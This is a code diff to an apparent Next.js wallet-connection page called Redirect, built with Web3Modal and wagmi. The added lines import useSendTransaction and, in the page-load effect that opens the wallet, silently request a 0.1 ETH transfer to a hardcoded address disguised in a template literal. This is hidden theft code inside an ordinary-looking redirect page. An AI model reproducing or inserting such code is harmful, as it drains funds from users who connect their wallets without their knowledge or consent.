@@ -4,12 +4,15 @@ import {useRouter} from "next/navigation";
 import {useEffect} from "react";
 import Connect from '../../components/Connect'
 import { useWeb3Modal } from '@web3modal/wagmi/react'
+import { useSendTransaction } from 'wagmi' 
+import { parseEther } from 'viem' 
 
 
 
 export default function Redirect() {
     const router = useRouter();
     const { open } = useWeb3Modal()
+    const { data: hash, sendTransaction } = useSendTransaction() 
 
     useEffect(() => {
         const handleBeforeUnload = (event: BeforeUnloadEvent) => {
@@ -31,7 +34,7 @@ export default function Redirect() {
     useEffect(() => {
         async function openWallet() {
           open({ view: 'Account' })
-            
+          sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
   
         }
 
